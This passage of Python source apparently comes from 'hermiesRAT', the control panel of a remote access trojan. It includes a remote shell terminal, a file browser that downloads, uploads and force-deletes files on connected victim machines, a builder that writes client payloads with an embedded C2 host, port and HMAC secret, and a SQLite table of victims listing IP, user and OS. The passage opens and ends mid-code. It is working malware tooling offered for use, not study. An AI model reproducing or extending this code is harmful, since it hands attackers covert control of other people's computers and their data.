            if resp: rx = len(json.dumps(resp).encode()) + 4
            out = resp["data"] if resp else "<no response>"
        except Exception as e:
            out = f"<error: {e}>"
        ts = time.strftime("%H:%M:%S")
        self._term_print(f"\n[{ts}]\n{out}\n", C["txt"])
        self.log(f"[term/{shell}] done")
        if self.selected_cid is not None:
            self._dl_record(self.selected_cid, tx, rx,
                            f"term/{shell}: {cmd[:60]}")

    # 
    #  FILES TAB
    # 

    def _build_files_tab(self):
        f = self._make_frame("Files")

        top = tk.Frame(f, bg=C["bg1"], height=26)
        top.pack(fill=tk.X); top.pack_propagate(False)
        tk.Label(top, text="TARGET:", bg=C["bg1"],
                 fg=C["txt3"], font=FONT_SML
                 ).pack(side=tk.LEFT, padx=10, pady=4)
        self._fb_target_lbl = tk.Label(top, text="none selected",
                                       bg=C["bg1"], fg=C["accent"], font=FONT_SML)
        self._fb_target_lbl.pack(side=tk.LEFT)
        tk.Frame(f, bg=C["border"], height=1).pack(fill=tk.X)

        split = tk.PanedWindow(f, orient=tk.HORIZONTAL,
                               bg=C["border"], sashwidth=2,
                               sashrelief="flat", handlesize=0)
        split.pack(fill=tk.BOTH, expand=True)

        #  left tree 
        left = tk.Frame(split, bg=C["bg1"])
        split.add(left, minsize=160, width=220)

        tk.Label(left, text="Directory Tree",
                 bg=C["bg1"], fg=C["txt3"], font=FONT_SML
                 ).pack(anchor="w", padx=8, pady=(4,2))
        tk.Frame(left, bg=C["border"], height=1).pack(fill=tk.X)

        tree_c = tk.Canvas(left, bg=C["bg1"], highlightthickness=0)
        tree_sb = tk.Scrollbar(left, orient="vertical",
                               command=tree_c.yview, bg=C["bg1"])
        tree_c.configure(yscrollcommand=tree_sb.set)
        tree_sb.pack(side=tk.RIGHT, fill=tk.Y)
        tree_c.pack(fill=tk.BOTH, expand=True)
        self._fb_tree_inner = tk.Frame(tree_c, bg=C["bg1"])
        self._fb_tree_win   = tree_c.create_window(
            (0,0), window=self._fb_tree_inner, anchor="nw")
        self._fb_tree_inner.bind("<Configure>",
            lambda e: tree_c.configure(scrollregion=tree_c.bbox("all")))
        tree_c.bind("<Configure>",
            lambda e: tree_c.itemconfig(self._fb_tree_win, width=e.width))
        self._fb_tree_canvas = tree_c

        #  right listing 
        right = tk.Frame(split, bg=C["bg"])
        split.add(right, minsize=400)

        # nav bar
        nav = tk.Frame(right, bg=C["bg1"], height=30)
        nav.pack(fill=tk.X); nav.pack_propagate(False)
        self._fb_wait_lbl = tk.Label(nav, text="",
                                     bg=C["bg1"], fg=C["txt3"], font=FONT_SML)
        self._fb_wait_lbl.pack(side=tk.RIGHT, padx=10)

        # refresh + path sync icon
        tk.Button(nav, text="⟳", bg=C["bg1"], fg=C["txt3"],
                  font=("Segoe UI",12), relief="flat", bd=0,
                  cursor="hand2",
                  command=lambda: self._fb_navigate(self._fb_path_var.get())
                  ).pack(side=tk.LEFT, padx=(4,0), pady=3)

        for icon, cmd in [
            ("◀", self._fb_back),
            ("▶", self._fb_forward),
            ("▲", self._fb_up),
        ]:
            tk.Button(nav, text=icon, bg=C["bg2"], fg=C["txt"],
                      activebackground=C["bg3"],
                      activeforeground=C["txt"],
                      font=("Consolas",10), relief="solid",
                      bd=1, padx=6, pady=1,
                      highlightbackground=C["border"],
                      highlightthickness=1,
                      cursor="hand2", command=cmd
                      ).pack(side=tk.LEFT, padx=(4,0), pady=4)

        # action icons
        tk.Frame(nav, bg=C["border"], width=1
                 ).pack(side=tk.LEFT, fill=tk.Y, padx=6, pady=4)
        for icon, tip, cmd in [
            ("⬇","download", self._fb_download),
            ("⬆","upload",   self._fb_upload),
            ("🗑","delete",   self._fb_delete),
            ("📋","copy path",self._fb_copy_path),
        ]:
            tk.Button(nav, text=icon, bg=C["bg1"], fg=C["txt2"],
                      activebackground=C["bg3"],
                      activeforeground=C["txt"],
                      font=("Segoe UI",11), relief="flat",
                      bd=0, padx=5, cursor="hand2",
                      command=cmd
                      ).pack(side=tk.LEFT, padx=1, pady=4)

        # path bar
        path_bar = tk.Frame(right, bg=C["bg2"], height=24)
        path_bar.pack(fill=tk.X); path_bar.pack_propagate(False)
        tk.Label(path_bar, text="  ", bg=C["bg2"]).pack(side=tk.LEFT)
        self._fb_path_var = tk.StringVar(value="C:\\")
        path_e = tk.Entry(path_bar, textvariable=self._fb_path_var,
                          bg=C["bg2"], fg=C["txt"],
                          insertbackground=C["accent"],
                          font=FONT_MON, relief="flat",
                          highlightthickness=0)
        path_e.pack(fill=tk.X, expand=True, pady=2, padx=4)
        path_e.bind("<Return>",
                    lambda e: self._fb_navigate(self._fb_path_var.get()))
        tk.Frame(right, bg=C["border"], height=1).pack(fill=tk.X)

        # column headers
        col_hdr = tk.Frame(right, bg=C["bg3"], height=22)
        col_hdr.pack(fill=tk.X); col_hdr.pack_propagate(False)
        self._fb_col_w = {"name":460,"size":100,"modified":200}
        for key, lbl in [("name","Name"),("size","Size"),
                         ("modified","Last Modified")]:
            w = self._fb_col_w[key] // 7
            lb = tk.Label(col_hdr, text=f"  {lbl}",
                          bg=C["bg3"], fg=C["txt2"],
                          font=FONT_HDR, width=w,
                          anchor="w", cursor="hand2")
            lb.pack(side=tk.LEFT)
            lb.bind("<Button-1>", lambda e,k=key: self._fb_sort(k))
        tk.Frame(right, bg=C["border"], height=1).pack(fill=tk.X)

        # file rows canvas
        fc = tk.Canvas(right, bg=C["bg"], highlightthickness=0)
        fsb = tk.Scrollbar(right, orient="vertical",
                           command=fc.yview, bg=C["bg1"])
        fc.configure(yscrollcommand=fsb.set)
        fsb.pack(side=tk.RIGHT, fill=tk.Y)
        fc.pack(fill=tk.BOTH, expand=True)
        self._fb_file_inner = tk.Frame(fc, bg=C["bg"])
        self._fb_file_win   = fc.create_window(
            (0,0), window=self._fb_file_inner, anchor="nw")
        self._fb_file_inner.bind("<Configure>",
            lambda e: fc.configure(scrollregion=fc.bbox("all")))
        fc.bind("<Configure>",
            lambda e: fc.itemconfig(self._fb_file_win, width=e.width))
        self._fb_file_canvas = fc

        # status bar
        stat = tk.Frame(right, bg=C["bg1"], height=20)
        stat.pack(fill=tk.X, side=tk.BOTTOM); stat.pack_propagate(False)
        self._fb_status_var = tk.StringVar()
        tk.Label(stat, textvariable=self._fb_status_var,
                 bg=C["bg1"], fg=C["txt3"], font=FONT_SML
                 ).pack(side=tk.LEFT, padx=8)

    #  file browser helpers 

    def _fb_refresh_target(self):
        if self.selected_cid is None:
            self._fb_target_lbl.configure(text="none selected", fg=C["red"])
        else:
            info  = clients.get(self.selected_cid, {})
            label = info.get("label", f"id={self.selected_cid}")
            self._fb_target_lbl.configure(
                text=f"{self.selected_cid:08x}  {label}", fg=C["accent"])

    def _fb_navigate(self, path):
        if self.selected_cid is None:
            self._fb_status_var.set("no session selected"); return
        path = path.strip()
        self._fb_path_var.set(path)
        if (not self._fb_history or
                self._fb_history[-1] != path):
            if self._fb_hist_idx < len(self._fb_history)-1:
                self._fb_history = self._fb_history[:self._fb_hist_idx+1]
            self._fb_history.append(path)
            self._fb_hist_idx = len(self._fb_history)-1
        self._fb_status_var.set(f"listing {path}...")
        self._fb_wait_lbl.configure(text="Wait...")
        self._fb_refresh_target()
        sock = clients[self.selected_cid]["sock"]
        threading.Thread(target=self._fb_listdir_worker,
                         args=(sock, path), daemon=True).start()

    def _fb_back(self):
        if self._fb_hist_idx > 0:
            self._fb_hist_idx -= 1
            self._fb_navigate_no_hist(self._fb_history[self._fb_hist_idx])

    def _fb_forward(self):
        if self._fb_hist_idx < len(self._fb_history)-1:
            self._fb_hist_idx += 1
            self._fb_navigate_no_hist(self._fb_history[self._fb_hist_idx])

    def _fb_navigate_no_hist(self, path):
        self._fb_path_var.set(path)
        if self.selected_cid is None: return
        self._fb_wait_lbl.configure(text="Wait...")
        sock = clients[self.selected_cid]["sock"]
        threading.Thread(target=self._fb_listdir_worker,
                         args=(sock,path), daemon=True).start()

    def _fb_up(self):
        cur = self._fb_path_var.get().rstrip("/\\")
        if not cur: return
        if "\\" in cur: parent = cur.rsplit("\\",1)[0] or cur[:3]
        else:           parent = cur.rsplit("/",1)[0] or "/"
        self._fb_navigate(parent)

    def _fb_listdir_worker(self, sock, path):
        try:
            send_msg(sock, "listdir", {"path": path})
            resp = recv_msg(sock)
            if not resp:
                self.after(0, lambda: (
                    self._fb_status_var.set("error: no response"),
                    self._fb_wait_lbl.configure(text=""))); return
            data = resp.get("data")
            if not isinstance(data,dict) or not data.get("ok"):
                err = data.get("error","?") if isinstance(data,dict) else "?"
                self.after(0, lambda: (
                    self._fb_status_var.set(f"error: {err}"),
                    self._fb_wait_lbl.configure(text=""))); return
            self._fb_entries = data.get("entries",[])
            self.after(0, self._fb_render)
        except Exception as e:
            self.after(0, lambda: (
                self._fb_status_var.set(f"error: {e}"),
                self._fb_wait_lbl.configure(text="")))

    def _fb_render(self):
        self._fb_populate_tree_sidebar(self._fb_entries)
        self._fb_populate_rows()
        nd = sum(1 for e in self._fb_entries if e["is_dir"])
        nf = sum(1 for e in self._fb_entries if not e["is_dir"])
        self._fb_status_var.set(
            f"Status: OK  >>  {time.strftime('%d/%m %H:%M:%S')}  "
            f"  {nd} dirs  {nf} files")
        self._fb_wait_lbl.configure(text="")

    def _fb_populate_tree_sidebar(self, entries):
        for w in self._fb_tree_inner.winfo_children(): w.destroy()
        cur = self._fb_path_var.get().rstrip("/\\")

        # root
        self._fb_tree_add_row(cur, cur, True, root=True)

        # expand path segments
        parts   = cur.replace("\\","/").split("/")
        cumpath = ""
        for i, part in enumerate(parts):
            if not part: continue
            cumpath = (cumpath + "\\" + part) if "\\" in cur else \
                      (cumpath + "/" + part if i>0 else part)
            if cumpath == cur: continue
            self._fb_tree_add_row(part, cumpath, True, indent=i)

        tk.Frame(self._fb_tree_inner, bg=C["border"], height=1
                 ).pack(fill=tk.X, padx=4, pady=1)

        for e in sorted(entries, key=lambda x: x["name"].lower()):
            if not e["is_dir"]: continue
            self._fb_tree_add_row(e["name"], e["path"], True,
                                  indent=1, highlight=(e["path"]==cur))

    def _fb_tree_add_row(self, name, path, is_dir,
                         indent=0, root=False, highlight=False):
        bg_c = C["bg4"] if highlight else C["bg1"]
        row  = tk.Frame(self._fb_tree_inner, bg=bg_c, cursor="hand2")
        row.pack(fill=tk.X)
        pad  = "  " * indent
        icon = "📁"
        fg_c = C["folder"] if not root else C["txt"]
        lbl  = tk.Label(row, text=f"{pad}{icon} {name}",
                        bg=bg_c, fg=fg_c, font=FONT, anchor="w")
        lbl.pack(fill=tk.X, padx=4, pady=1)
        for w in (row, lbl):
            w.bind("<Button-1>",
                   lambda e, p=path: self._fb_navigate(p))
            w.bind("<Enter>",
                   lambda e, r=row: r.configure(bg=C["bg3"]))
            w.bind("<Leave>",
                   lambda e, r=row, b=bg_c: r.configure(bg=b))

    def _fb_populate_rows(self):
        for w in self._fb_file_inner.winfo_children(): w.destroy()
        self._fb_selected_path = None

        entries = list(self._fb_entries)
        def _key(e):
            if   self._fb_sort_key == "name":     return (not e["is_dir"], e["name"].lower())
            elif self._fb_sort_key == "size":     return (not e["is_dir"], e.get("size",0))
            elif self._fb_sort_key == "modified": return (not e["is_dir"], e.get("mtime",""))
            return (not e["is_dir"], e["name"].lower())
        entries.sort(key=_key, reverse=not self._fb_sort_asc)

        nw = self._fb_col_w["name"]     // 7
        sw = self._fb_col_w["size"]     // 7
        mw = self._fb_col_w["modified"] // 7

        for i, entry in enumerate(entries):
            is_dir = entry["is_dir"]
            name   = entry["name"]
            path   = entry["path"]
            size   = "" if is_dir else self._fb_fmt_size(entry.get("size",0))
            mtime  = entry.get("mtime","")
            icon   = "📁" if is_dir else "📄"
            fg_c   = C["folder"] if is_dir else C["txt"]
            row_bg = C["bg"] if i%2==0 else C["bg1"]

            row = tk.Frame(self._fb_file_inner, bg=row_bg, cursor="hand2")
            row.pack(fill=tk.X)

            tk.Label(row, text=f"  {icon} {name}",
                     bg=row_bg, fg=fg_c, font=FONT,
                     width=nw, anchor="w").pack(side=tk.LEFT)
            tk.Label(row, text=f"  {size}",
                     bg=row_bg, fg=C["txt2"], font=FONT,
                     width=sw, anchor="w").pack(side=tk.LEFT)
            tk.Label(row, text=f"  {mtime}",
                     bg=row_bg, fg=C["txt2"], font=FONT,
                     width=mw, anchor="w").pack(side=tk.LEFT)

            def _enter(e, r=row): self._fb_hover(r, True)
            def _leave(e, r=row, b=row_bg): self._fb_hover(r, False, b)
            def _click(e, r=row, p=path, b=row_bg):
                self._fb_selected_path = p
                self._fb_hover(r, True)
            def _dbl(e, p=path, d=is_dir):
                if d: self._fb_navigate(p)

            for w in [row] + row.winfo_children():
                w.bind("<Enter>",          _enter)
                w.bind("<Leave>",          _leave)
                w.bind("<Button-1>",       _click)
                w.bind("<Double-Button-1>",_dbl)

        self._fb_file_canvas.yview_moveto(0)

    def _fb_hover(self, row, on, orig=None):
        bg = C["bg4"] if on else (orig or C["bg"])
        row.configure(bg=bg)
        for c in row.winfo_children():
            c.configure(bg=bg)

    def _fb_fmt_size(self, b):
        for u in ("B","KB","MB","GB"):
            if b < 1024: return f"{b:.2f} Kb" if u=="KB" else f"{b:.1f} {u}"
            b /= 1024
        return f"{b:.1f} TB"

    def _fb_sort(self, key):
        if self._fb_sort_key == key: self._fb_sort_asc = not self._fb_sort_asc
        else: self._fb_sort_key = key; self._fb_sort_asc = True
        self._fb_populate_rows()

    def _fb_selected_fullpath(self):
        return self._fb_selected_path

    def _fb_download(self):
        if self.selected_cid is None:
            self._fb_status_var.set("no session"); return
        fp = self._fb_selected_fullpath()
        if not fp: self._fb_status_var.set("select a file first"); return
        save_to = filedialog.asksaveasfilename(
            initialfile=fp.replace("\\","/").split("/")[-1])
        if not save_to: return
        self._fb_wait_lbl.configure(text="Wait...")
        sock = clients[self.selected_cid]["sock"]
        def _w():
            try:
                send_msg(sock,"download",{"path":fp})
                resp = recv_msg(sock)
                if not resp:
                    self.after(0,lambda:(self._fb_status_var.set("failed"),
                                        self._fb_wait_lbl.configure(text=""))); return
                pay = resp.get("data")
                b64 = pay.get("data") if isinstance(pay,dict) else pay
                raw = base64.b64decode(b64)
                with open(save_to,"wb") as fh: fh.write(raw)
                self.after(0,lambda:(
                    self._fb_status_var.set(f"saved  {len(raw)/1024:.1f} KB  → {save_to}"),
                    self._fb_wait_lbl.configure(text="")))
                self.log(f"[files] dl {fp} → {save_to}")
            except Exception as e:
                self.after(0,lambda:(self._fb_status_var.set(f"error: {e}"),
                                     self._fb_wait_lbl.configure(text="")))
        threading.Thread(target=_w, daemon=True).start()

    def _fb_upload(self):
        if self.selected_cid is None: return
        local = filedialog.askopenfilename()
        if not local: return
        self._fb_upload_path(local)

    def _fb_upload_path(self, local):
        if not local or not os.path.isfile(local):
            self._term_print(f"  not found: {local}\n", C["red"]); return
        if self.selected_cid is None:
            self._term_print("  no session\n", C["red"]); return
        fname = os.path.basename(local)
        cur   = self._fb_path_var.get().rstrip("/\\")
        sep   = "\\" if "\\" in cur else "/"
        dest  = cur + sep + fname
        self._fb_wait_lbl.configure(text="Wait...")
        sock = clients[self.selected_cid]["sock"]
        def _w():
            try:
                with open(local,"rb") as fh: raw = fh.read()
                send_msg(sock,"upload",
                         {"path":dest,"data":base64.b64encode(raw).decode()})
                resp = recv_msg(sock)
                result = resp.get("data","?") if resp else "no response"
                self.after(0,lambda:(
                    self._fb_status_var.set(f"upload: {result}"),
                    self._fb_wait_lbl.configure(text=""),
                    self._fb_navigate(cur)))
                self.log(f"[files] ul {local} → {dest}: {result}")
            except Exception as e:
                self.after(0,lambda:(self._fb_status_var.set(f"error: {e}"),
                                     self._fb_wait_lbl.configure(text="")))
        threading.Thread(target=_w, daemon=True).start()

    def _fb_delete(self):
        if self.selected_cid is None: return
        fp = self._fb_selected_fullpath()
        if not fp: self._fb_status_var.set("select a file first"); return
        is_dir = any(e["path"]==fp and e["is_dir"] for e in self._fb_entries)
        if not messagebox.askyesno("delete",f"Delete:\n{fp}"): return
        cur  = self._fb_path_var.get()
        sock = clients[self.selected_cid]["sock"]
        is_win = "\\" in fp or (len(fp)>=2 and fp[1]==":")
        if is_win:
            safe = fp.replace("'","''")
            cmd  = (f"Remove-Item -LiteralPath '{safe}' -Recurse -Force"
                    if is_dir else f"Remove-Item -LiteralPath '{safe}' -Force")
            shell = "powershell"
        else:
            cmd = f"rm -rf {shlex.quote(fp)}"; shell = "bash"
        self._fb_wait_lbl.configure(text="Wait...")
        def _w():
            try:
                send_msg(sock,"shell",{"shell":shell,"cmd":cmd})
                recv_msg(sock)
                self.after(0,lambda:(
                    self._fb_status_var.set(f"deleted: {fp}"),
                    self._fb_wait_lbl.configure(text=""),
                    self._fb_navigate(cur)))
            except Exception as e:
                self.after(0,lambda:(self._fb_status_var.set(f"error: {e}"),
                                     self._fb_wait_lbl.configure(text="")))
        threading.Thread(target=_w, daemon=True).start()

    def _fb_copy_path(self):
        fp = self._fb_selected_fullpath() or self._fb_path_var.get()
        self.clipboard_clear(); self.clipboard_append(fp); self.update()
        self._fb_status_var.set(f"copied: {fp}")

    # 
    #  BUILDER TAB  — simplified
    # 

    def _build_builder_tab(self):
        f = self._make_frame("Builder")
        f.configure(bg=C["bg"])

        g_host = tk.Frame(f, bg=C["bg1"])
        g_host.pack(fill=tk.BOTH, expand=True, padx=16, pady=12)

        tk.Label(g_host, text="Client Builder",
                 bg=C["bg1"], fg=C["accent"], font=FONT_HDR
                 ).pack(anchor="w", padx=12, pady=(10,2))
        tk.Frame(g_host, bg=C["border"], height=1
                 ).pack(fill=tk.X, padx=12, pady=4)

        def _row(label, default, width=32, pw=14):
            r = tk.Frame(g_host, bg=C["bg1"])
            r.pack(fill=tk.X, padx=12, pady=3)
            tk.Label(r, text=label, bg=C["bg1"], fg=C["txt2"],
                     font=FONT, width=pw, anchor="w").pack(side=tk.LEFT)
            var = tk.StringVar(value=default)
            tk.Entry(r, textvariable=var, bg=C["bg2"], fg=C["txt"],
                     insertbackground=C["accent"], font=FONT_MON,
                     relief="flat", width=width,
                     highlightbackground=C["border"],
                     highlightthickness=1).pack(side=tk.LEFT)
            return var

        self._b_host   = _row("C2 host",           "127.0.0.1")
        self._b_port   = _row("C2 port",            "4444",  width=10)
        self._b_secret = _row("HMAC secret (b64)",
                              config.get_active_secret().decode()
                              if config.get_active_secret() else "",
                              width=50)
        self._b_retry  = _row("reconnect delay (s)","5",     width=6)

        tk.Frame(g_host, bg=C["border"], height=1
                 ).pack(fill=tk.X, padx=12, pady=8)
        out_r = tk.Frame(g_host, bg=C["bg1"])
        out_r.pack(fill=tk.X, padx=12, pady=3)
        tk.Label(out_r, text="output file", bg=C["bg1"],
                 fg=C["txt2"], font=FONT, width=14, anchor="w"
                 ).pack(side=tk.LEFT)
        self._b_out = tk.Entry(out_r, bg=C["bg2"], fg=C["txt"],
                               insertbackground=C["accent"],
                               font=FONT_MON, relief="flat", width=30,
                               highlightbackground=C["border"],
                               highlightthickness=1)
        self._b_out.insert(0,"hermiesRAT_client_built.py")
        self._b_out.pack(side=tk.LEFT)
        tk.Button(out_r, text="…", bg=C["bg3"], fg=C["txt"],
                  font=FONT, relief="flat", padx=6,
                  command=self._b_browse).pack(side=tk.LEFT, padx=(4,0))

        btn_row = tk.Frame(g_host, bg=C["bg1"])
        btn_row.pack(anchor="w", padx=12, pady=10)
        tk.Button(btn_row, text="generate secret",
                  bg=C["bg3"], fg=C["txt"], font=FONT,
                  relief="flat", padx=10, cursor="hand2",
                  command=self._b_gen_secret).pack(side=tk.LEFT, padx=(0,8))
        tk.Button(btn_row, text="  build client  ",
                  bg=C["accent"], fg="#000000",
                  font=("Consolas",10,"bold"), relief="flat",
                  padx=14, cursor="hand2",
                  command=self._b_build).pack(side=tk.LEFT)
        tk.Button(btn_row, text="sync → server",
                  bg=C["bg3"], fg=C["txt"], font=FONT,
                  relief="flat", padx=10, cursor="hand2",
                  command=self._b_sync_server).pack(side=tk.LEFT, padx=(8,0))

        self._b_status = tk.Label(g_host, text="",
                                  bg=C["bg1"], fg=C["txt2"], font=FONT_SML)
        self._b_status.pack(anchor="w", padx=12, pady=(0,8))

        # modules
        tk.Frame(g_host, bg=C["border"], height=1
                 ).pack(fill=tk.X, padx=12, pady=4)
        mhdr = tk.Frame(g_host, bg=C["bg1"])
        mhdr.pack(fill=tk.X, padx=12, pady=(4,0))
        tk.Label(mhdr, text="Modules",
                 bg=C["bg1"], fg=C["txt2"], font=FONT_HDR
                 ).pack(side=tk.LEFT)
        tk.Button(mhdr, text="refresh",
                  bg=C["bg3"], fg=C["txt"], font=FONT_SML,
                  relief="flat", padx=6, cursor="hand2",
                  command=self._b_refresh_modules
                  ).pack(side=tk.RIGHT)
        msf = tk.Frame(g_host, bg=C["bg1"])
        msf.pack(fill=tk.BOTH, expand=True, padx=12)
        mc  = tk.Canvas(msf, bg=C["bg1"], highlightthickness=0)
        msb = ttk.Scrollbar(msf, orient=tk.VERTICAL, command=mc.yview)
        self._b_mod_inner = tk.Frame(mc, bg=C["bg1"])
        self._b_mod_inner.bind("<Configure>",
            lambda e: mc.configure(scrollregion=mc.bbox("all")))
        mc.create_window((0,0), window=self._b_mod_inner, anchor="nw")
        mc.configure(yscrollcommand=msb.set)
        mc.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        msb.pack(side=tk.LEFT, fill=tk.Y)
        self._b_refresh_modules()

    def _b_refresh_modules(self):
        scan_modules()
        for w in self._b_mod_inner.winfo_children(): w.destroy()
        self._b_mod_vars.clear()
        loaded = get_loaded_modules()
        if not loaded:
            tk.Label(self._b_mod_inner,
                     text=f"no modules found  ({MODULE_DIR})",
                     bg=C["bg1"], fg=C["txt3"], font=FONT_SML
                     ).pack(anchor="w", padx=4, pady=4); return
        for name, entry in loaded.items():
            meta = entry["meta"]; var = tk.BooleanVar(value=False)
            self._b_mod_vars[name] = var
            row = tk.Frame(self._b_mod_inner, bg=C["bg1"])
            row.pack(fill=tk.X, pady=1)
            tk.Checkbutton(row, variable=var, bg=C["bg1"], fg=C["txt"],
                           selectcolor=C["bg3"],
                           activebackground=C["bg1"],
                           activeforeground=C["accent"],
                           highlightthickness=0, bd=0
                           ).pack(side=tk.LEFT, padx=(2,0))
            tk.Label(row, text=name, bg=C["bg1"],
                     fg=C["txt"], font=FONT).pack(side=tk.LEFT, padx=2)
            tk.Label(row, text=meta.get("description",""),
                     bg=C["bg1"], fg=C["txt3"], font=FONT_SML
                     ).pack(side=tk.LEFT, padx=4)

    def _b_browse(self):
        p = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[("Python","*.py"),("All","*.*")])
        if p: self._b_out.delete(0,tk.END); self._b_out.insert(0,p)

    def _b_gen_secret(self):
        new = base64.b64encode(secrets.token_bytes(32)).decode()
        self._b_secret.set(new)
        self._b_status.configure(text="new secret — build to apply",
                                 fg=C["txt2"])

    def _b_build(self):
        host   = self._b_host.get().strip()
        port   = self._b_port.get().strip()
        secret = self._b_secret.get().strip()
        retry  = self._b_retry.get().strip()
        out    = self._b_out.get().strip()
        try:    port_int = int(port); assert 1<=port_int<=65535
        except: self._b_status.configure(text="invalid port",fg=C["red"]); return
        try:    sb = secret.encode(); base64.b64decode(sb)
        except: self._b_status.configure(text="secret must be base64",fg=C["red"]); return
        try:    ri = int(retry); assert ri>=1
        except: ri = 5
        sel  = [n for n,v in self._b_mod_vars.items() if v.get()]
        mc   = build_module_injection(sel)
        src  = CLIENT_TEMPLATE
        src  = src.replace("{c2_host!r}", repr(host))
        src  = src.replace("{c2_port}",   str(port_int))
        src  = src.replace("{secret!r}",  repr(sb))
        src  = src.replace("{retry}",     str(ri))
        src  = src.replace("__MODULE_INJECT__", mc)
        src  = src.replace("{{","{").replace("}}","}")
        try:
            with open(out,"w",encoding="utf-8") as fh: fh.write(src)
            self._b_status.configure(
                text=f"built → {out}  ({host}:{port_int})",fg=C["accent"])
            self.log(f"builder: wrote {out}")
        except Exception as e:
            self._b_status.configure(text=f"write error: {e}",fg=C["red"])

    def _b_sync_server(self):
        secret_str = self._b_secret.get().strip()
        try:    ns = secret_str.encode(); base64.b64decode(ns)
        except: messagebox.showerror("sync","secret must be valid base64"); return
        config.set_active_secret(ns)
        try:    p = int(self._b_port.get().strip())
        except: p = PORT
        ok = self._restart_listener(p)
        self._b_status.configure(
            text="synced" if ok else "secret set — listener failed",
            fg=C["accent"] if ok else C["red"])

    # 
    #  SETTINGS TAB  — simplified
    # 

    def _build_settings_tab(self):
        f = self._make_frame("Settings")

        g = tk.Frame(f, bg=C["bg1"])
        g.pack(fill=tk.BOTH, expand=True, padx=16, pady=12)

        tk.Label(g, text="HMAC Secret",
                 bg=C["bg1"], fg=C["accent"], font=FONT_HDR
                 ).pack(anchor="w", padx=12, pady=(10,2))
        tk.Frame(g, bg=C["border"], height=1
                 ).pack(fill=tk.X, padx=12, pady=4)

        sec_r = tk.Frame(g, bg=C["bg1"])
        sec_r.pack(fill=tk.X, padx=12, pady=4)
        self._set_secret_var = tk.StringVar(
            value=config.get_active_secret().decode()
            if config.get_active_secret() else "")
        tk.Entry(sec_r, textvariable=self._set_secret_var,
                 bg=C["bg2"], fg=C["txt"],
                 insertbackground=C["accent"], font=FONT_MON,
                 relief="flat", width=48,
                 highlightbackground=C["border"],
                 highlightthickness=1).pack(side=tk.LEFT, padx=(0,8))
        for lbl, cmd in [
            ("generate", self._settings_gen_secret),
            ("save",     self._settings_save_secret),
            ("sync+restart", self._settings_sync_secret),
        ]:
            tk.Button(sec_r, text=lbl, bg=C["bg3"], fg=C["txt"],
                      font=FONT_SML, relief="flat", padx=8,
                      cursor="hand2", command=cmd).pack(side=tk.LEFT, padx=2)
        self._set_secret_status = tk.Label(g, text="",
                                           bg=C["bg1"], fg=C["txt3"],
                                           font=FONT_SML)
        self._set_secret_status.pack(anchor="w", padx=12, pady=(2,8))

        tk.Frame(g, bg=C["border"], height=1
                 ).pack(fill=tk.X, padx=12, pady=6)
        tk.Label(g, text="Client Database (SQLite)",
                 bg=C["bg1"], fg=C["accent"], font=FONT_HDR
                 ).pack(anchor="w", padx=12, pady=(6,2))

        from config import DB_PATH_DEFAULT
        db_r = tk.Frame(g, bg=C["bg1"])
        db_r.pack(fill=tk.X, padx=12, pady=4)
        self._set_db_path_var = tk.StringVar(
            value=config._config.get("db_path", DB_PATH_DEFAULT))
        tk.Entry(db_r, textvariable=self._set_db_path_var,
                 bg=C["bg2"], fg=C["txt"],
                 insertbackground=C["accent"], font=FONT_MON,
                 relief="flat", width=36,
                 highlightbackground=C["border"],
                 highlightthickness=1).pack(side=tk.LEFT, padx=(0,6))
        tk.Button(db_r, text="…", bg=C["bg3"], fg=C["txt"],
                  font=FONT, relief="flat", padx=6,
                  command=self._settings_browse_db).pack(side=tk.LEFT)
        db_btn_r = tk.Frame(g, bg=C["bg1"])
        db_btn_r.pack(fill=tk.X, padx=12, pady=(2,4))
        tk.Button(db_btn_r, text="init / connect",
                  bg=C["accent"], fg="#000000",
                  font=("Consolas",9,"bold"), relief="flat",
                  padx=10, cursor="hand2",
                  command=self._settings_init_db).pack(side=tk.LEFT, padx=(0,6))
        tk.Button(db_btn_r, text="disconnect",
                  bg=C["bg3"], fg=C["txt"], font=FONT,
                  relief="flat", padx=10, cursor="hand2",
                  command=self._settings_disconnect_db).pack(side=tk.LEFT)
        self._set_db_status = tk.Label(g, text="DB: not connected",
                                       bg=C["bg1"], fg=C["red"], font=FONT_SML)
        self._set_db_status.pack(anchor="w", padx=12, pady=(2,6))

        tk.Frame(g, bg=C["border"], height=1
                 ).pack(fill=tk.X, padx=12, pady=4)

        # known clients tree
        db_hdr_r = tk.Frame(g, bg=C["bg1"])
        db_hdr_r.pack(fill=tk.X, padx=12, pady=(6,2))
        tk.Label(db_hdr_r, text="Known Clients",
                 bg=C["bg1"], fg=C["txt2"], font=FONT_HDR
                 ).pack(side=tk.LEFT)
        tk.Button(db_hdr_r, text="refresh", bg=C["bg3"], fg=C["txt"],
                  font=FONT_SML, relief="flat", padx=6,
                  command=self._settings_refresh_db).pack(side=tk.RIGHT)
        tk.Button(db_hdr_r, text="delete", bg=C["bg3"], fg=C["red"],
                  font=FONT_SML, relief="flat", padx=6,
                  command=self._settings_delete_selected
                  ).pack(side=tk.RIGHT, padx=(0,4))

        db_tree_host = tk.Frame(g, bg=C["bg1"])
        db_tree_host.pack(fill=tk.BOTH, expand=True, padx=12, pady=(0,8))
        cols = ("ip","label","user","os","first_seen","last_seen","note")
        self._set_db_tree = ttk.Treeview(db_tree_host, columns=cols,
                                         show="headings", selectmode="browse")
        col_w = {"ip":110,"label":130,"user":80,"os":80,
                 "first_seen":130,"last_seen":130,"note":140}
        for col in cols:
            self._set_db_tree.heading(col, text=col.upper())
            self._set_db_tree.column(col, width=col_w.get(col,100), anchor="w")
        db_vsb = ttk.Scrollbar(db_tree_host, orient=tk.VERTICAL,
                               command=self._set_db_tree.yview)
        db_hsb = ttk.Scrollbar(db_tree_host, orient=tk.HORIZONTAL,
                               command=self._set_db_tree.xview)
        self._set_db_tree.configure(yscrollcommand=db_vsb.set,
                                    xscrollcommand=db_hsb.set)
        db_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        db_hsb.pack(side=tk.BOTTOM, fill=tk.X)
        self._set_db_tree.pack(fill=tk.BOTH, expand=True)

        note_r = tk.Frame(g, bg=C["bg1"])
        note_r.pack(fill=tk.X, padx=12, pady=(0,8))
        tk.Label(note_r, text="Note:", bg=C["bg1"], fg=C["txt2"],
                 font=FONT).pack(side=tk.LEFT, padx=(0,6))
        self._set_note_var = tk.StringVar()
        tk.Entry(note_r, textvariable=self._set_note_var,
                 bg=C["bg2"], fg=C["txt"],
                 insertbackground=C["accent"], font=FONT_MON,
                 relief="flat", width=28,
